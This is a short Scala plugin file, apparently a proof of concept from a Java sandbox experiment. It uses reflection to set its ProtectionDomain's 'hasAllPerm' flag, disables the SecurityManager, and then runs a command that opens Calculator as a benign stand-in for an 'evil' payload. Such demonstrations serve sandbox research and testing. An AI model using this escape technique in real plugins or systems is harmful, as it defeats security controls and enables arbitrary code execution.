package plugins

import java.lang.reflect.Field

import sandbox1.shared.Plugin

/**
  * Created by adrian.bravo on 3/4/17.
  */
class Plugin3 extends Plugin {
  println("[PLUGIN] Initialising plugin")

  override def run(): Unit = {
    val our_pd = getClass.getProtectionDomain
    val klass = our_pd.getClass
    val field = klass.getDeclaredField("hasAllPerm")

    field.setAccessible(true)
    // Give ourselves all permissions
    field.setBoolean(our_pd, true)
    // Disable security manager
    System.setSecurityManager(null)
    // Do evil stuff
    Runtime.getRuntime.exec("open /Applications/Calculator.app/")

    println("[PLUGIN] Plugin over")
  }
}
